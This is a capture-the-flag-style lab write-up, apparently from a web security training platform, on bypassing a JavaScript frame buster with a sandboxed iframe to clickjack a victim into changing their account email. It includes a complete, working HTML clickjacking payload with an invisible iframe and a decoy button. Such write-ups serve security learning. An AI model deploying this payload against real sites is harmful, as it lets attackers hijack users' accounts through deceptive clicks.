
## Lab 03: Clickjacking with a Frame Buster Script
 
**Technique:** Clickjacking with sandbox iframe to bypass frame busting
**Target:** Update email button
**Status:** Solved
 
### Context
 
Applications sometimes try to prevent themselves from being loaded inside iframes using a JavaScript frame buster. The typical pattern looks something like this:
 
```javascript
if (top !== self) {
    top.location = self.location;
}
```
 
This checks if the page is the top level window. If it is not, meaning it is inside a frame, it tries to redirect the parent to its own URL, breaking out of the iframe.
 
The bypass is the `sandbox` attribute on the iframe. When you add `sandbox` to an iframe, it restricts what the page inside can do. By default a sandboxed iframe blocks JavaScript execution entirely. So the frame buster script never runs.
 
The problem with blocking all JavaScript is that it also blocks form submission. That would break the attack too. But the sandbox attribute accepts specific permission flags you can selectively re-enable. The flag `allow-forms` re-enables form submission while still keeping JavaScript blocked. The frame buster is dead. The form still works.
 
### The Payload
 
```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
 
div {
    position: absolute;
    top: 520px;
    left: 70px;
    z-index: 1;
}
</style>
 
<div>Click me</div>
 
<iframe sandbox="allow-forms"
src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com">
</iframe>
```
 
### The Key Difference
 
`sandbox="allow-forms"` is what makes this lab different from the previous two. Without it the frame buster would fire and break out of the iframe. With it, JavaScript is blocked so the frame buster cannot run, and `allow-forms` puts form submission back so the email update still goes through when the victim clicks.
 
### Result
 
Victim clicked the decoy. Form submitted inside the sandboxed iframe. Email changed. Lab solved.
 
